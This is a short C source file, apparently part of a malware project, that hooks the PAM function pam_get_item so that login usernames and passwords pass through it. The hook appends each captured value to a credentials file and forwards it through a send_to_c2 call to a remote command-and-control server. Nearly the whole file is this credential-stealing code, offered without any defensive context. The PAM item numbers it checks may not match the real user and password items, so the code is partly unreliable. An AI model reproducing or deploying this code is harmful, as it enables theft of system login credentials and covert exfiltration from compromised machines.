#define _GNU_SOURCE
#include "malware.h"

typedef const void* (*pam_get_item_t)(void*, int);

const void* pam_get_item(void *pamh, int item)
{
    static pam_get_item_t orig = NULL;
    if (!orig) {
        orig = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
    }
    const void *res = orig(pamh, item);
    if (item == 0 || item == 1) {
        char logline[256];
        if (res) {
            if (item == 0)
                snprintf(logline, sizeof(logline), "USER: %s\n", (char*)res);
            else
                snprintf(logline, sizeof(logline), "PASS: %s\n", (char*)res);
            FILE *fp = fopen(CREDS_FILE, "a");
            if (fp) {
                fputs(logline, fp);
                fclose(fp);
            }
            send_to_c2(logline);
        }
    }
    return res;
}
